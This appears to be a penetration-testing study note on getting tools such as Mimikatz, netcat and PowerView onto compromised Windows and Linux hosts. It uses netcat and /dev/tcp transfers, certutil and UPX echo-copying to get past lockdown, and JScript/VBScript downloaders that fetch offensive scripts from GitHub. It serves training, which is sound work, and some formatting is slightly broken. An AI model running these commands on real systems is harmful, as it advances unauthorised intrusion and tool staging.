# Miscellaneous File Transfer Methods
# Web Servers

In addition to Apache and NGINX, it is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed or access to the Internet, so a mini web server can be used. What they perhaps lack in security, they make up for in flexibility, as the webroot location and listening ports can quickly be changed.

## Python 2
````bash
python -m SimpleHTTPServer 8080
````
## Python 3
````bash
python3 -m http.server 8080
````
## Ruby
````bash
ruby -run -ehttpd . -p8080
````
## PHP
````bash
php -S 0.0.0.0:8080
````
## Socat
````bash
socat TCP-LISTEN:8080,reuseaddr,fork
````

**With administrative access to a Windows machine, IIS can be easily installed.**

## Socat
````powershell
PS C:\htb> Add-WindowsFeature Web-Server, Web-Mgmt-Tools
````

## SMB / WebDAV

SMB is a good option for file transfers, as on Windows as you don’t need to install anything. SMB traffic features prominently on networks, and SMB file transfers to Windows computers are expected. Unfortunately, it’s also the case that outbound SMB traffic is often allowed through the external firewall. In case SMB traffic through the firewall has been restricted, WebDAV may be a good option, as it relies on HTTP as a transport protocol. Some common tools that support file transfers from SMB and WebDAV shares are reviewed below.

See [[smb.md]]

## PowerShell
### Copy-Item
````powershell
Copy-Item -Path C:\Temp\nc.exe -Destination C:\Temp\nc.exe -ToSession $session
````
### Set-Content
````powershell
$file = Get-Content C:\Temp\nc.exe -Raw
Invoke-Command -ComputerName 10.10.10.132 -ScriptBlock {Set-Content -Path C:\Temp\nc.exe -value $using:file}
````
### Copy / xcopy / robocopy
````powershell
xcopy \\10.10.10.132\share\nc.exe nc.exe
copy C:\Temp\nc.exe \\10.10.10.132\c$\Temp\nc.exe
````
### Map / Mount Drives
````powershell
net use Q: \\10.10.10.132\share
pushd \\10.10.10.132\share
mklink /D share \\10.10.10.132\share
````
## Map / Mount Drives
````powershell
smbclient //10.10.10.132/share -U username -W domain
````
## Netcat
Netcat is a very versatile tool that also allows file transfers. The target or attacking machine can be used to initiate the connection, which is useful if a firewall prevents access to the target. The commands below both result in Mimikatz being transferred to the target computer.

### Connection Initiated by Pentester
````bash
nc -nlvp 8000 > mimikatz.exe
````

````bash
nc -nv 10.10.10.132 8000 <mimikatz.exe
````
### Connection Initiated by Target
````bash
nc -nv 10.10.10.32 8000 > mimikatz.exe
````

````bash
nc -nlvp 8000 <mimikatz.exe
````

Netcat can also serve content for transfer by the /dev/tcp device file.

### Start Netcat Listener
````bash
nc -lvnp 80 <LinEnum.sh
````
### Download The File
````bash
cat < /dev/tcp/10.10.10.32/80 > LinEnum.sh
````
## SCP
[[SCP]]
The OpenSSH client is available by default on Linux and has been included in Windows 10 and Windows Server 2019 since Autumn 2018. On Windows, the OpenSSH server can be enabled using this procedure. On older Windows systems, the PuTTY Secure Copy client (pscp.exe) can be used.

### SCP Upload
````bash
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
````
### SCP Download
````bash
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
````
## FTP
Windows 10 includes a native FTP client, which can also read commands from a script to work in a non-interactive shell.

### Ftp-script.txt
  
**Create a file with name: Ftp-script.txt**
````powershell 
open 10.10.10.32
anonymous
anonymous
lcd C:\Temp
get nc.exe
quit
````
#### FTP Transfer
````powershell
ftp -s:ftp-script.txt
````
## TFTP
The TFTP client is not available by default in Windows, but it can be enabled using DISM. \

### FTP Transfer
DISM /online /Enable-Feature /FeatureName:TFTP
````
In newer versions of Windows, the Install-WindowsFeature PowerShell cmdlet can also be used. Both DISM and Install-WindowsFeature require administrative access.

### FTP Transfer
````powershell
Install-WindowsFeature TFTP-Client
````
## RDP
Remote Desktop is often enabled on Windows machines, and from Linux, rdesktop can be used to expose a local folder in the remote RDP session.

````bash
rdesktop 10.10.10.132 -r disk:linux='/home/user/rdesktop/files'
````
Alternatively, from Windows, the native mstsc.exe remote desktop client can be used.

![windows](https://academy.hackthebox.com/storage/modules/24/rdp.png)

After selecting the drive, we can interact with it in the remote session as follows:

````powershell
copy \\tsclient\c\temp\mimikatz.exe .
````
This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.

## Echo Copy
On machines with a very stringent lockdown policy, it may be necessary to echo copy files. Let’s examine how nc.exe can be transferred to a target Windows computer using this method.

Echo copying files is very inefficient and can result in a large amount of data being transferred across the clipboard, so we can use an executable packer such as UPX to make the source file as small as possible.

````bash
upx --best nc.exe
````
````bash
upx.exe --best nc.exe

                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     59392 ->     29696   50.00%    win32/pe     nc.exe                        

Packed 1 file.
````
Next, we need to convert the binary data to base64. Windows contains a native utility that can do this - certutil.
````powershell
PS C:\htb> certutil.exe -encode nc.exe nc.txt
````
Open the resulting text file in a text editor that supports the replacement of extended characters (\n \r \t \0 \x...), such as Notepad++. Replace newlines with **echo "**.

````bash
Find:\n
Replace:echo "
````

![echo](https://academy.hackthebox.com/storage/modules/24/find-replace.png)

The first line doesn’t contain this, so we can manually prepend **echo "** to the first line. Next, we replace **\r** with **" >> nc.txt\r**.

````bash
Find:\r
Replace:" >> nc.txt\r
````
![netcat](https://academy.hackthebox.com/storage/modules/24/find_replace2.png)

If the last line has an **echo "** on its own, remove it.

Next, copy all the text, and paste it into the shell, pressing enter if needed on the last command. This time, use the -decode certutil switch to convert the base64 text back to binary.

````powershell
certutil.exe -decode nc.txt nc.exe
cmd /c "nc.exe -h 2>&1"
````

## OpenSSL base64
If OpenSSL is available on the target system, this can also be used to encode and decode the data in place of certutil.

### Encryption
````bash
openssl.exe enc -base64 -in nc.exe -out nc.txt
````
### Decryption
````powershell
openssl.exe enc -base64 -d -in nc.txt -out nc.exe
````
## JavaScript
The following JavaScript, based on this post, can be used.

````javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
````
It can be executed as follows.

````powershell
cscript /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
````
## VBScript
The following VBScript, based on this post can be used.

````vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
````
It can be executed as follows.

````powershell
cscript /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
````
